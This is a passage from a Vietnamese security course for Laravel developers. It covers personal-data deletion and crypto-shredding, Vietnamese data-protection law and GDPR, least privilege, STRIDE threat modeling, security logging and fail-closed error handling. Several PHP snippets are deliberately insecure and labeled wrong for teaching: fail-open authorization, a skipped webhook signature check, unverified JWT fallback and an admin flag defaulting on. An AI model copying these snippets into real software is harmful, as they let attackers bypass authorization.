| Object storage (avatar, file upload) | Xoá object; nhớ các bản versioned nếu bucket bật versioning |
| Queue đang chờ | Job phải chịu được việc user không còn (không crash, không tạo lại dữ liệu) |
| Log, APM | Để hết hạn theo retention; vì thế log càng ít PII càng dễ |
| Data warehouse | Job xoá định kỳ theo danh sách user đã yêu cầu |
| Bên thứ ba (CRM, email marketing, analytics) | Gọi API xoá của họ; ghi lại bằng chứng đã gọi |
| Backup | Không sửa được từng dòng: để hết hạn theo vòng đời (xem dưới) |

Kiến trúc hay dùng: phát sự kiện `UserDeletionRequested`, mỗi service hay mỗi nơi lưu có một consumer
tự xoá phần của mình rồi báo hoàn tất; một bảng theo dõi ghi trạng thái từng nơi để biết khi nào xong
hết.

Backup: backup là snapshot, không thể xoá một dòng bên trong mà không phá tính toàn vẹn. Cách chấp
nhận được là giữ backup theo vòng đời cố định (ví dụ 30 ngày) để dữ liệu tự biến mất khi backup hết
hạn, và giữ một danh sách ID đã xoá (chỉ ID, không kèm PII). ⚠️ Khi phải restore backup cũ, chạy lại
việc xoá theo danh sách đó, nếu không user đã xoá sẽ "sống lại". Chi tiết về backup và PITR xem
[03-database-sql.md#35-backup-pitr-rporto](03-database-sql.md#35-backup-pitr-rporto).

Phần luật bắt buộc giữ thì giữ, phần còn lại ẩn danh hoá. Ví dụ hoá đơn, chứng từ kế toán phải lưu
theo thời hạn của luật chuyên ngành: giữ bản ghi đơn hàng và số tiền, nhưng thay tên, email, SĐT của
người mua bằng giá trị ẩn danh nếu không bắt buộc. Cả GDPR lẫn luật Việt Nam đều có ngoại lệ cho
trường hợp luật khác yêu cầu lưu.

*Crypto-shredding* (xoá bằng cách huỷ key): mỗi user có một data key riêng, các trường PII của user
đó được mã hoá bằng key này (key lại được bọc bởi master key trong KMS, theo mô hình envelope
encryption ở [module 3.3](#33-crypto-ứng-dụng-và-quản-lý-key)). Khi cần xoá, chỉ việc huỷ data key:
mọi bản mã của user đó ở mọi nơi, kể cả trong backup, trở thành chuỗi byte vô nghĩa.

```
 users row (DB + mọi backup)          key store (tách riêng, không nằm trong backup DB)
 ┌───────────────────────────┐        ┌───────────────────────────────┐
 │ id=42                     │        │ user 42 -> data key (đã bọc)  │ ← xoá dòng này
 │ email_enc = AES(k42, ...) │ ─────▶ │ user 43 -> data key (đã bọc)  │
 │ phone_enc = AES(k42, ...) │        └───────────────────────────────┘
 └───────────────────────────┘
```

⚠️ Cạm bẫy của crypto-shredding:
- Key store phải nằm ngoài backup của DB, và chính backup của key store cũng phải hết hạn, nếu không
  key "đã xoá" vẫn còn trong một bản backup key.
- Chỉ bảo vệ những gì đã mã hoá bằng key đó. Bản rõ trong search index, cache, log, warehouse không
  được bảo vệ.
- Cột mã hoá không tìm kiếm, sắp xếp được; muốn tra theo email phải có cột blind index (HMAC của
  email) riêng, và cột đó cũng phải xử lý khi xoá.

#### Pháp lý, mức "biết tồn tại"

Kỹ sư không cần thuộc điều khoản, nhưng phải biết đủ để thiết kế hệ thống đáp ứng được và biết khi
nào cần hỏi pháp chế.

Việt Nam: Luật Bảo vệ dữ liệu cá nhân số 91/2025/QH15, Quốc hội thông qua ngày 26/6/2025, hiệu lực
từ ngày 01/01/2026. Luật gồm 5 chương, 39 điều. Văn bản hướng dẫn là Nghị định 356/2025/NĐ-CP (ngày
31/12/2025, hiệu lực cùng ngày 01/01/2026). Chính nghị định này chấm dứt hiệu lực của Nghị định
13/2023/NĐ-CP (Điều 42), văn bản trước đó điều chỉnh việc bảo vệ dữ liệu cá nhân. Luật có điều khoản
chuyển tiếp (Điều 39): hoạt động xử lý đã được đồng ý theo Nghị định 13 thì tiếp tục, không phải xin
đồng ý lại; hồ sơ đánh giá tác động đã được cơ quan chuyên trách tiếp nhận theo Nghị định 13 vẫn
tiếp tục dùng được.

Những điểm của luật 91/2025 mà kỹ sư nên biết (theo văn bản luật):

- Phạm vi: áp dụng cả với tổ chức nước ngoài trực tiếp tham gia hoặc liên quan tới xử lý dữ liệu cá
  nhân của công dân Việt Nam (Điều 1).
- Quyền của chủ thể dữ liệu (Điều 4): được biết về việc xử lý; đồng ý, không đồng ý, rút lại đồng ý;
  xem, chỉnh sửa; yêu cầu cung cấp, xoá, hạn chế xử lý, phản đối xử lý; khiếu nại, khởi kiện, đòi bồi
  thường. Bên kiểm soát dữ liệu phải thực hiện yêu cầu trong thời hạn luật định (Chính phủ quy định
  chi tiết; Điều 5 Nghị định 356 đặt thời hạn cụ thể, ví dụ yêu cầu xoá: phản hồi trong 2 ngày làm
  việc, thực hiện trong 20 ngày).
- Sự đồng ý (Điều 9): phải tự nguyện, biết rõ loại dữ liệu, mục đích, bên kiểm soát dữ liệu, quyền
  và nghĩa vụ của chủ thể; thể hiện rõ ràng, cụ thể, in hoặc sao chép được, gồm cả dạng điện tử hoặc
  định dạng kiểm chứng được; đồng ý cho từng mục đích; không được kèm điều kiện bắt buộc phải đồng ý
  cho mục đích khác; im lặng hoặc không phản hồi không được coi là đồng ý. Hệ quả thiết kế: checkbox
  không tích sẵn, mỗi mục đích một lựa chọn, và lưu bằng chứng đồng ý (phiên bản văn bản, thời điểm).
- Xoá, huỷ (Điều 14): thực hiện khi chủ thể yêu cầu, khi đã xong mục đích, khi hết thời hạn lưu...;
  phải bằng biện pháp an toàn, chặn khôi phục trái phép. Không xoá được vì lý do chính đáng thì phải
  báo cho chủ thể biết.
- Thông báo vi phạm (Điều 23): vi phạm có thể gây tổn hại tới quốc phòng, an ninh quốc gia, trật tự,
  an toàn xã hội, hoặc xâm phạm tính mạng, sức khoẻ, danh dự, nhân phẩm, tài sản của chủ thể thì
  phải báo cơ quan chuyên trách bảo vệ dữ
  liệu cá nhân (thuộc Bộ Công an) chậm nhất 72 giờ kể từ khi phát hiện. Bên xử lý (processor) phát
  hiện thì phải báo kịp thời cho bên kiểm soát.
- Chuyển dữ liệu ra nước ngoài (Điều 20): gồm cả việc dùng nền tảng đặt ở nước ngoài để xử lý dữ liệu
  thu thập tại Việt Nam (tức là rất nhiều SaaS và cloud region ngoài nước). Phải lập hồ sơ đánh giá
  tác động chuyển dữ liệu xuyên biên giới, gửi cơ quan chuyên trách trong 60 ngày kể từ lần chuyển
  đầu tiên. Có ngoại lệ, ví dụ tổ chức lưu dữ liệu người lao động của chính mình trên dịch vụ đám mây.
- Đánh giá tác động xử lý dữ liệu (Điều 21): lập hồ sơ, gửi trong 60 ngày kể từ ngày đầu xử lý, làm
  một lần cho suốt thời gian hoạt động; hồ sơ được cập nhật định kỳ 6 tháng khi có thay đổi, và cập
  nhật ngay trong một số trường hợp như tổ chức lại, giải thể, thay đổi ngành nghề liên quan (Điều 22).
- Doanh nghiệp nhỏ, doanh nghiệp khởi nghiệp được chọn thực hiện hay không các nghĩa vụ ở Điều 21,
  Điều 22 (hồ sơ đánh giá tác động xử lý và việc cập nhật) và khoản 2 Điều 33 (chỉ định bộ phận, nhân
  sự bảo vệ dữ liệu) trong 5 năm kể từ ngày luật có hiệu lực; hộ kinh doanh, doanh nghiệp siêu nhỏ
  thì không phải thực hiện các nghĩa vụ này. Ngoại lệ: kinh doanh dịch vụ xử lý dữ liệu, trực tiếp xử
  lý dữ liệu nhạy cảm, hoặc xử lý dữ liệu của số lượng lớn chủ thể (Điều 38; Điều 41 Nghị định 356
  đặt ngưỡng từ 100 nghìn chủ thể, tính cộng dồn). Hồ sơ chuyển dữ liệu xuyên biên giới (Điều 20)
  không có trong danh sách được miễn này.
- Cấm mua bán dữ liệu cá nhân, trừ khi luật có quy định khác (Điều 7).
- Mức phạt hành chính tối đa (Điều 8, mức áp cho tổ chức; cá nhân bằng một nửa): mua bán dữ liệu tới
  10 lần khoản thu có được; vi phạm về chuyển dữ liệu xuyên biên giới tới 5% doanh thu năm trước
  liền kề; vi phạm khác tới 3 tỷ đồng.

EU: GDPR áp dụng cho công ty ngoài EU khi công ty đó chào bán hàng hoá, dịch vụ cho người đang ở EU,
hoặc theo dõi hành vi của họ trong EU. Nghĩa là một startup Việt Nam có khách ở EU (bán app, chạy
tracking) có thể thuộc phạm vi, dù không có văn phòng ở châu Âu. Hai điều hay được hỏi:

- Art. 17, quyền được xoá ("right to be forgotten"): chủ thể yêu cầu xoá và bên kiểm soát phải xoá
  "without undue delay" khi rơi vào một trong các căn cứ, ví dụ dữ liệu không còn cần cho mục đích
  thu thập, chủ thể rút lại đồng ý mà không còn căn cứ khác, dữ liệu bị xử lý trái phép. Nếu dữ liệu
  đã công khai, bên kiểm soát phải thực hiện các bước hợp lý để báo cho các bên đang xử lý xoá link
  và bản sao. Ngoại lệ: cần để tuân thủ nghĩa vụ pháp lý, vì lợi ích công về y tế, lưu trữ nghiên cứu
  hoặc thống kê, để lập hoặc bảo vệ yêu cầu pháp lý, hoặc cho quyền tự do ngôn luận.
- Art. 33, báo cáo sự cố: báo cơ quan giám sát không chậm trễ và, nếu khả thi, trong 72 giờ kể từ khi
  biết, trừ khi sự cố khó gây rủi ro cho quyền của cá nhân. Báo muộn hơn phải kèm lý do. Nội dung gồm
  bản chất sự cố (loại và số lượng xấp xỉ người và bản ghi bị ảnh hưởng), đầu mối liên hệ (DPO), hậu
  quả có thể xảy ra, biện pháp đã và sẽ làm; được phép cung cấp theo từng đợt. Mọi sự cố đều phải ghi
  hồ sơ nội bộ, kể cả sự cố không phải báo.
- Mức phạt tối đa của GDPR cho nhóm vi phạm nặng là 20 triệu euro hoặc 4% doanh thu toàn cầu năm
  trước, lấy mức cao hơn.

Ý chung của các luật và việc kỹ sư cần chuẩn bị:

| Yêu cầu pháp lý | Hệ thống cần có |
|---|---|
| Căn cứ hoặc sự đồng ý khi xử lý | Bảng lưu consent theo mục đích, phiên bản, thời điểm; rút lại được |
| Quyền truy cập, sửa | Chức năng export dữ liệu của user; màn hình sửa |
| Quyền xoá | Data inventory và luồng xoá qua mọi nơi lưu; danh sách ID đã xoá cho restore |
| Báo sự cố trong 72 giờ | Log và audit đủ để trả lời "lộ gì, của bao nhiêu người, từ khi nào" nhanh |
| Hạn chế chuyển ra nước ngoài | Biết dữ liệu đang ở region nào, bên thứ ba nào nhận |

⚠️ Đồng hồ 72 giờ chạy từ lúc phát hiện. Nếu không có audit log và data inventory, riêng việc trả lời
"dữ liệu gì bị lộ" đã tốn hơn 72 giờ. Đó là lý do các biện pháp kỹ thuật ở trên là điều kiện để tuân
thủ, không chỉ là "tốt nếu có".

**Tóm tắt nhanh**
- PII gồm cả dữ liệu "giúp xác định" (IP, device ID, tổ hợp thuộc tính). Mã hoá và hash email vẫn là
  dữ liệu cá nhân; chỉ khử nhận dạng thật mới thoát.
- Masking đặt ở tầng logger (Monolog processor qua `tap`), cộng quy ước không nội suy dữ liệu vào
  message, `#[\SensitiveParameter]`, và rà cả log ngoài app (Sentry, nginx, APM).
- PII lọt nhiều nhất ở log, backup, warehouse, staging, queue, bên thứ ba. Staging phải ẩn danh hoá
  từ bước dump.
- Xoá cần data inventory; backup để hết hạn và giữ danh sách ID đã xoá để chạy lại sau restore;
  crypto-shredding xử lý được backup nếu key store tách riêng.
- Việt Nam: Luật 91/2025/QH15, hiệu lực 01/01/2026, Nghị định 356/2025/NĐ-CP hướng dẫn và thay Nghị
  định 13/2023. Mốc báo sự cố 72 giờ có ở cả luật Việt Nam lẫn GDPR (điều kiện phải báo khác nhau).

**Nguồn**: [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) ·
[Luật Bảo vệ dữ liệu cá nhân 91/2025/QH15](https://chinhphu.vn/?pageid=27160&docid=214590&classid=1&typegroupid=3)
(toàn văn [PDF](https://datafiles.chinhphu.vn/cpp/files/vbpq/2025/7/91qh.signed.pdf)) ·
[Nghị định 356/2025/NĐ-CP](https://vanban.chinhphu.vn/?pageid=27160&docid=216387) ·
[GDPR Art. 17](https://gdpr-info.eu/art-17-gdpr/) · [GDPR Art. 33](https://gdpr-info.eu/art-33-gdpr/) ·
[Laravel 13: Logging](https://laravel.com/docs/13.x/logging)

---

### 3.6 Nguyên tắc, threat modeling, phát hiện

Module này trả lời: hai nguyên tắc nào đứng sau hầu hết biện pháp bảo mật, làm sao tìm ra rủi ro của
một tính năng trước khi viết code (threat modeling), và khi bị tấn công thì hệ thống phát hiện và phản
ứng thế nào, kể cả khi chính code xử lý lỗi của mình là lỗ hổng.

#### Hai nguyên tắc nền

*Least privilege* (quyền tối thiểu): mỗi thành phần, người, service, token chỉ có đúng quyền cần cho
việc của nó, không hơn. Mục đích là giới hạn *blast radius* (phạm vi thiệt hại) khi thành phần đó bị
chiếm: kẻ tấn công chỉ làm được những gì thành phần đó được phép.

Ví dụ ở từng tầng:

```sql
-- User DB của app: đủ CRUD, không DROP, ALTER, GRANT, FILE
CREATE USER 'app'@'10.0.%' IDENTIFIED BY '...';
GRANT SELECT, INSERT, UPDATE, DELETE ON shop.* TO 'app'@'10.0.%';
-- Migration chạy bằng user khác, chỉ dùng lúc deploy
CREATE USER 'migrator'@'10.0.%' IDENTIFIED BY '...';
GRANT ALL PRIVILEGES ON shop.* TO 'migrator'@'10.0.%';
```

Nếu app dính SQL injection, kẻ tấn công vẫn đọc được dữ liệu (tệ), nhưng không `DROP TABLE`, không
tự cấp quyền, không ghi file ra đĩa bằng `SELECT ... INTO OUTFILE` được.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::invoices-prod/*"
  }]
}
```

IAM policy trên cho service hoá đơn chỉ đọc, ghi object trong đúng một bucket, không liệt kê bucket
khác, không xoá. So với gán sẵn quyền kiểu "full S3" cho nhanh, khác biệt chỉ lộ ra vào ngày service
bị chiếm.

Các dạng khác của least privilege:
- Token có scope hẹp: token của tích hợp báo cáo chỉ có `reports:read`, không có `orders:write`
  (xem OAuth ở module 2.3).
- Tài khoản admin tách khỏi tài khoản dùng hằng ngày: đọc email, duyệt web bằng tài khoản thường;
  phishing chiếm được tài khoản thường thì không kèm quyền admin.
- Quyền theo thời gian: *just-in-time access*, xin quyền vào production trong 2 giờ có phê duyệt,
  hết giờ tự thu hồi, thay vì quyền vĩnh viễn. Có tài khoản *break-glass* cho sự cố, mọi lần dùng đều
  gây cảnh báo.
- ⚠️ Quyền phình dần theo thời gian (privilege creep): người chuyển team vẫn giữ quyền cũ. Cần rà
  soát quyền định kỳ.

*Defense in depth* (phòng thủ nhiều lớp): đặt nhiều lớp kiểm soát độc lập, để một lớp thất bại thì lớp
khác vẫn chặn hoặc ít nhất làm giảm thiệt hại. Ví dụ với SQL injection:

```
request độc
   │
   ▼
[1] WAF (Web Application Firewall): lọc request có mẫu tấn công đã biết, trước khi tới app
   │   (bị vượt qua bằng encoding lạ)
   ▼
[2] Validate input: id phải là số nguyên dương
   │   (endpoint mới quên validate)
   ▼
[3] Prepared statement: dữ liệu không bao giờ thành câu lệnh     ← lớp chính
   │   (một chỗ dev nối chuỗi trong ORDER BY)
   ▼
[4] Least privilege ở DB: không DROP, không FILE, không đọc bảng của hệ thống khác
   │
   ▼
[5] Monitoring: tỉ lệ lỗi SQL syntax tăng vọt → cảnh báo → người trực xem
```

Hai cạm bẫy khi nói về defense in depth:
- ⚠️ Các lớp phải độc lập. Hai lớp cùng dựa vào một giả định (ví dụ cùng tin header `X-Forwarded-For`
  do client gửi) thì thực chất chỉ là một lớp.
- ⚠️ Lớp phụ không thay lớp chính. "Đã có WAF" không phải lý do bỏ prepared statement; WAF dựa trên
  mẫu nên luôn có cách vượt. Mỗi loại lỗ hổng phải có lớp chặn tận gốc ở code, các lớp khác là bảo
  hiểm.

#### Threat modeling

*Threat modeling* là phân tích một mô tả của hệ thống (sơ đồ, thiết kế) để tìm ra các vấn đề về bảo
mật và quyền riêng tư, trước khi chúng thành code. Threat Modeling Manifesto tóm nó trong bốn câu hỏi:

1. Chúng ta đang xây gì? (What are we working on?)
2. Cái gì có thể hỏng? (What can go wrong?)
3. Chúng ta sẽ làm gì với nó? (What are we going to do about it?)
4. Đã làm đủ tốt chưa? (Did we do a good enough job?)

Câu 1: vẽ *DFD* (Data Flow Diagram, sơ đồ luồng dữ liệu). Chỉ cần năm loại phần tử:

| Phần tử | Nghĩa | Ví dụ |
|---|---|---|
| External entity | Tác nhân ngoài hệ thống, mình không kiểm soát | User, dịch vụ thanh toán, bên OCR |
| Process | Thành phần xử lý dữ liệu | API Laravel, queue worker |
| Data store | Nơi lưu | MySQL, S3, Redis |
| Data flow | Dữ liệu đi giữa hai phần tử | HTTPS request, job trong queue |
| Trust boundary | Ranh giới giữa hai vùng tin cậy khác nhau | Internet ↔ app; app ↔ bên thứ ba |

*Ranh giới tin cậy* là chỗ quan trọng nhất trên sơ đồ: mọi data flow cắt qua ranh giới là nơi cần
xác thực, kiểm quyền, validate, mã hoá. Phần lớn lỗ hổng nằm ở các chỗ cắt này.

Câu 2: *STRIDE* là bộ gợi ý của Microsoft, mỗi chữ một loại mối đe doạ, và mỗi loại vi phạm một thuộc
tính bảo mật (theo OWASP Threat Modeling Cheat Sheet):

| Chữ | Mối đe doạ | Thuộc tính bị vi phạm | Ví dụ |
|---|---|---|---|
| S, Spoofing | Giả danh người, service khác | Authentication | Dùng token đánh cắp để gọi API |
| T, Tampering | Sửa dữ liệu trái phép | Integrity | Sửa giá trong request thanh toán |
| R, Repudiation | Chối bỏ đã làm, mà không có bằng chứng | Accounting (truy vết; hay gọi là non-repudiation) | "Tôi không chuyển tiền", và không có audit log |
| I, Information disclosure | Lộ thông tin cho người không được xem | Confidentiality | API trả thừa field, lỗi lộ stack trace |
| D, Denial of service | Làm dịch vụ không dùng được | Availability | Upload file khổng lồ làm nổ memory |
| E, Elevation of privilege | Có được quyền cao hơn quyền được cấp | Authorization | Sửa claim `role` trong JWT không verify |

Mẹo để không bỏ sót: áp STRIDE theo từng phần tử của DFD (*STRIDE-per-element*, cách Adam Shostack
mô tả trong sách *Threat Modeling*). Không phải loại nào cũng áp cho mọi phần tử:

| Phần tử | S | T | R | I | D | E |
|---|---|---|---|---|---|---|
| External entity | ✓ | | ✓ | | | |
| Process | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Data flow | | ✓ | | ✓ | ✓ | |
| Data store | | ✓ | (✓ nếu chứa log) | ✓ | ✓ | |

Câu 3: với mỗi mối đe doạ, chọn một trong bốn cách phản hồi:
- *Mitigate* (giảm thiểu): thêm biện pháp giảm khả năng xảy ra hoặc thiệt hại. Phổ biến nhất.
- *Eliminate* (loại bỏ): bỏ luôn tính năng gây rủi ro. Ví dụ không cho upload SVG nữa.
- *Transfer* (chuyển giao): để bên khác chịu, ví dụ dùng cổng thanh toán hosted để không bao giờ chạm
  vào số thẻ.
- *Accept* (chấp nhận): ghi nhận rủi ro, không làm gì vì chi phí cao hơn lợi ích. Phải có người có
  thẩm quyền ký nhận, không phải dev tự quyết.

Ưu tiên theo khả năng xảy ra × thiệt hại: một lỗi dễ khai thác, lộ dữ liệu của mọi khách hàng xếp
trước một lỗi cần chiếm được máy chủ nội bộ mới khai thác được. Biện pháp giảm thiểu nên được viết
thành yêu cầu kiểm chứng được (ticket, test), OWASP gợi ý dùng ASVS làm nguồn yêu cầu.

Câu 4: rà lại xem DFD có đúng thiết kế thật không, mỗi mối đe doạ đã có quyết định chưa, biện pháp có
test được không. Và threat model không phải làm một lần: thiết kế đổi thì cập nhật.

Ví dụ làm mẫu trong khoảng 30 phút (tiêu chí "Nắm chắc khi"): tính năng "user upload hoá đơn PDF, hệ
thống gửi sang bên thứ ba OCR rồi lưu kết quả".

```
          ┆ trust boundary 1                     ┆ trust boundary 2
 [User] ──┆─(1) POST /invoices (PDF)─▶ (API) ──(2) put─▶ [[S3 invoices]]
          ┆                             │                     │
          ┆                        (3) job                    │
          ┆                             ▼                     │
          ┆                        (Worker) ──(4) presigned URL─┆──▶ [OCR vendor]
          ┆                             │   ◀─(5) webhook kết quả┆──
          ┆                        (6) ghi                     ┆
          ┆                             ▼                     ┆
          ┆                        [[MySQL]]                  ┆
```

Một phần kết quả STRIDE (không đầy đủ):

| Chỗ | STRIDE | Mối đe doạ | Phản hồi |
|---|---|---|---|
| (1) | S | Gọi API bằng session người khác | Mitigate: auth bắt buộc, session chuẩn (module 1.2) |
| (1) | D | Upload file 2 GB, hoặc PDF bomb | Mitigate: giới hạn kích thước ở nginx và app, rate limit |
| (1) | T | File "PDF" thật ra là HTML, script | Mitigate: kiểm magic bytes, lưu với content-type cố định, không phục vụ cùng domain |
| (2) | I | Bucket để public, đoán được key | Mitigate: bucket private, key ngẫu nhiên, truy cập qua presigned URL ngắn hạn |
| (4) | I | Vendor giữ bản sao hoá đơn chứa PII | Transfer một phần qua hợp đồng; ghi vào data inventory (module 3.5) |
| (5) | S | Kẻ lạ gọi webhook giả, ghi kết quả OCR sai | Mitigate: verify chữ ký HMAC, chống replay bằng timestamp |
| (5) | E | Webhook ghi vào hoá đơn của user khác qua ID | Mitigate: map kết quả theo job ID do mình sinh, không tin ID từ payload |
| (6) | R | User nói "tôi không upload hoá đơn này" | Mitigate: audit log ai upload, lúc nào, từ IP nào |

Những giá trị Threat Modeling Manifesto nhấn mạnh, cũng là cách trả lời hay khi được hỏi "làm threat
modeling thế nào trong team":
- Văn hoá tìm và sửa lỗi thiết kế hơn là tick checklist cho đủ thủ tục.
- Con người và sự cộng tác hơn là quy trình, công cụ.
- Làm thật hơn là nói về nó; tinh chỉnh liên tục hơn là giao một lần.
- Anti-pattern nên tránh: "hero threat modeler" (chỉ một chuyên gia làm được, thực ra ai cũng làm
  được); sa đà phân tích mà không ra giải pháp; mải tìm một sơ đồ hoàn hảo (nhiều góc nhìn đơn giản
  tốt hơn một sơ đồ hoàn hảo).

Làm sớm, khi thiết kế tính năng nhạy cảm: thanh toán, upload, xác thực, phân quyền, tích hợp bên thứ
ba, bất cứ thứ gì chạm vào PII. Công cụ có thể dùng: bảng trắng là đủ; OWASP Threat Dragon hoặc
Microsoft Threat Modeling Tool nếu muốn lưu sơ đồ. Ngoài STRIDE còn có LINDDUN (tập trung quyền riêng
tư), PASTA, nhưng STRIDE là thứ gần như luôn được kỳ vọng biết.

#### Logging và phát hiện (A09:2025)

A09:2025 trong OWASP Top 10 là *Security Logging and Alerting Failures*: không log, log không ai xem,
hoặc có log mà không có cảnh báo. Nếu không phát hiện được, mọi lớp phòng thủ khác chỉ trì hoãn kẻ
tấn công chứ không dừng được họ.

Sự kiện bảo mật nên log (tổng hợp từ OWASP Logging Cheat Sheet):
- Xác thực thành công và thất bại, khoá tài khoản, đổi password, đổi email, bật tắt MFA.
- Kiểm quyền thất bại (403), truy cập tài nguyên không phải của mình.
- Validate input thất bại bất thường (có thể là dò lỗ hổng).
- Hành động quản trị: đổi quyền, tạo user admin, đổi cấu hình.
- Dùng chức năng rủi ro cao: export dữ liệu, xem dữ liệu nhạy cảm, thao tác với key.
- Bất thường nghiệp vụ: thao tác sai thứ tự, vượt giới hạn.

Mỗi sự kiện có đủ when (thời gian, đồng bộ giờ giữa các server), where (app, host, endpoint), who (IP,
user ID), what (loại sự kiện, đối tượng, kết quả, lý do). Ví dụ trong Laravel, nghe event xác thực
có sẵn:

```php
<?php
declare(strict_types=1);

namespace App\Providers;

use Illuminate\Auth\Events\Failed;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\ServiceProvider;

final class SecurityLogServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Event::listen(function (Failed $event): void {
            // ⚠️ KHÔNG log $event->credentials: trong đó có password người dùng vừa gõ.
            Log::channel('security')->warning('auth.login_failed', [
                'guard' => $event->guard,
                'user_id' => $event->user?->getAuthIdentifier(), // null nếu email không tồn tại
                'ip' => request()->ip(),
            ]);
        });

        Event::listen(function (Lockout $event): void {
            Log::channel('security')->warning('auth.lockout', ['ip' => $event->request->ip()]);
        });
    }
}
// Channel 'security' phải được khai báo trong config/logging.php, nên đẩy sang kho log tập trung.
```

Log mà không ai xem thì vô dụng; cần cảnh báo cho các mẫu bất thường:
- Số login thất bại toàn hệ thống tăng vọt so với bình thường: dấu hiệu credential stuffing (module
  2.9).
- Một IP hoặc một tài khoản gây nhiều 403 liên tiếp trên các ID khác nhau: dấu hiệu dò IDOR.
- Một user export lượng dữ liệu bất thường.
- *Honeytoken*: một bản ghi, API key hay tài khoản giả không ai dùng thật; có ai chạm vào là chắc
  chắn có vấn đề, gần như không có báo động giả. OWASP A09:2025 khuyến nghị cách này.

Bảo vệ chính log: log chứa thông tin cho kẻ tấn công (và PII), nên phải hạn chế người đọc; kẻ đã vào
được hệ thống thường tìm cách xoá dấu vết, nên log cần được đẩy ngay ra kho riêng, append-only (xem
audit log ở module 3.5). Chống log injection bằng encode dữ liệu khi ghi (log JSON).

Khi cảnh báo nổ, cần quy trình phản ứng sự cố: ai trực, ai quyết định, liên lạc thế nào, khi nào báo
pháp chế (nhớ mốc 72 giờ ở module 3.5). Chi tiết về on-call và quy trình sự cố ở
[18-reliability-observability.md](../18-reliability-observability.md).

#### Xử lý lỗi đúng (A10:2025)

A10:2025, *Mishandling of Exceptional Conditions*, là hạng mục mới trong bản 2025: ứng dụng không ngăn
được, không nhận ra được, hoặc phản ứng sai với tình huống bất thường (input thiếu, hết bộ nhớ, mất
mạng, thiếu quyền, exception không ai bắt). Hạng mục này gom 24 CWE, trong đó có CWE-209 (lộ thông tin
nhạy cảm trong thông báo lỗi) và CWE-636 (fail open, không thất bại an toàn).

*Fail closed* (thất bại an toàn): khi có lỗi thì từ chối, không cho qua. Ngược lại là *fail open*: lỗi
xảy ra và hệ thống coi như "được phép". Fail open hay nằm trong các khối `catch` viết vội:

```php
// SAI: service phân quyền timeout thì ai cũng được vào (fail open)
public function canView(int $userId, int $docId): bool
{
    try {
        return $this->policyClient->check($userId, $docId);
    } catch (\Throwable $e) {
        report($e);
        return true; // "để user khỏi bị chặn oan"
    }
}

// ĐÚNG: lỗi thì từ chối, và báo lỗi để người trực biết
public function canView(int $userId, int $docId): bool
{
    try {
        return $this->policyClient->check($userId, $docId);
    } catch (\Throwable $e) {
        report($e);
        return false;
    }
}
```

Các dạng fail open khác hay gặp trong code thật (gợi ý cho tiêu chí "chỉ ra 3 chỗ"):

```php
// Webhook: thiếu header chữ ký thì... bỏ qua kiểm tra
$sig = $request->header('X-Signature');
if ($sig !== null && !hash_equals($expected, $sig)) { abort(401); }   // SAI: không gửi header là qua
if (!is_string($sig) || !hash_equals($expected, $sig)) { abort(401); } // ĐÚNG

// Verify JWT: exception bị nuốt, code chạy tiếp với claims chưa verify
try { $claims = $jwt->verify($token); } catch (\Throwable) { $claims = $jwt->decodeUnsafe($token); } // SAI

// Feature flag hay config lỗi thì mặc định bật chức năng admin
$enabled = $config->get('admin_panel_enabled') ?? true;   // SAI: mặc định nên là false
```

⚠️ Không phải mọi thứ đều phải fail closed. Rate limiter dùng Redis: Redis chết mà fail closed thì cả
site trả 429, tức là tự gây DoS. Nhiều team chọn fail open cho rate limit nhưng kèm cảnh báo ngay. Ranh
giới: kiểm soát truy cập (authn, authz, verify chữ ký) luôn fail closed; kiểm soát chống lạm dụng có
thể cân nhắc, và phải là quyết định có chủ đích, ghi rõ trong threat model.

Không nuốt exception: `catch (\Throwable $e) {}` rỗng làm lỗi biến mất khỏi log và giám sát, dữ liệu
có thể đã ghi dở. Nguyên tắc từ OWASP A10:
- Bắt lỗi ngay tại nơi nó xảy ra và xử lý có ý nghĩa (thật sự khắc phục, phục hồi được), và đặt
  thêm một *global exception handler* làm lưới an toàn cho những gì bị sót (trong Laravel là
  exception handler của framework), nơi log và trả response chung.
- Giao dịch nhiều bước lỗi giữa chừng thì rollback toàn bộ, không cố "cứu" từng phần. Trong Laravel,
  `DB::transaction(fn () => ...)` tự rollback khi closure ném exception. Ví dụ tấn công trong OWASP:
  giao dịch chuyển tiền nhiều bước bị ngắt giữa chừng mà không rollback, kẻ tấn công có thể rút cạn
  tài khoản, hoặc lợi dụng race condition để chuyển tiền tới đích nhiều lần.
- Giải phóng tài nguyên trong `finally` (file, lock, kết nối). Ví dụ trong OWASP: xử lý lỗi upload
  mà không giải phóng tài nguyên, mỗi request lỗi giữ lại một ít cho tới khi cạn, thành DoS.
- Khi lỗi lặp lại nhiều, log thống kê (số lần) thay vì in cùng một lỗi hàng nghìn lần làm ngập log.

Không lộ chi tiết lỗi ra ngoài: stack trace, câu SQL, đường dẫn file, phiên bản thư viện trong
response giúp kẻ tấn công dò hệ thống (ví dụ lỗi SQL lộ ra giúp dò SQL injection). Trong Laravel,
production phải đặt `APP_DEBUG=false` để response lỗi là trang chung; chi tiết đi vào log kèm request
ID, và response trả request ID đó để support tra cứu. Tầng PHP (`display_errors=Off` ở production)
xem [05-php-laravel.md#37-bảo-mật-đặc-thù-php](05-php-laravel.md#37-bảo-mật-đặc-thù-php) và cách
thiết kế exception ở [05-php-laravel.md#14-exception-và-xử-lý-lỗi](05-php-laravel.md#14-exception-và-xử-lý-lỗi).

**Tóm tắt nhanh**
- Least privilege giới hạn blast radius (user DB không DROP/GRANT, IAM đúng bucket, token scope hẹp,
  admin tách riêng, JIT access). Defense in depth cần các lớp độc lập, và lớp phụ không thay lớp chính.
- Threat modeling = bốn câu hỏi; vẽ DFD với ranh giới tin cậy, áp STRIDE theo từng phần tử, chọn
  mitigate / eliminate / transfer / accept, ưu tiên theo khả năng × thiệt hại.
- STRIDE ứng với sáu thuộc tính: authentication, integrity, accounting (non-repudiation), confidentiality,
  availability, authorization.
- A09:2025: log sự kiện bảo mật đủ who/what/when/where, có cảnh báo (kể cả honeytoken), log được bảo
  vệ và không chứa secret.
